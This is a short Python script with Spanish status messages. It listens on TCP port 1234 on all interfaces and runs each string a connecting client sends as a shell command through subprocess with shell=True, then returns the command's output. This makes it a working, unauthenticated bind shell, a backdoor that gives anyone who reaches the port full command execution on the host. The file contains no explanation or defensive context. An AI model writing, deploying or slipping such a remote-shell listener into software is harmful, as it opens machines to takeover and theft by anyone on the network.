import socket
import subprocess


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = ""
port = 1234
server.bind((host, port))
server.listen(5)
client, addr = server.accept()

while True:
    content = client.recv(1024)
    content = content.decode("ascii")
    if len(content) == 0:
        print("Saliendo...")
        break
    print("Mensaje recibido")
    command = subprocess.Popen([content], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = command.communicate()
    print(command.returncode)
    if command.returncode == 0:
        ansubprocess = "OK \n"+stdout
    else:
        ansubprocess = "ERROR \n"+stderr

    client.send(ansubprocess.encode('ascii'))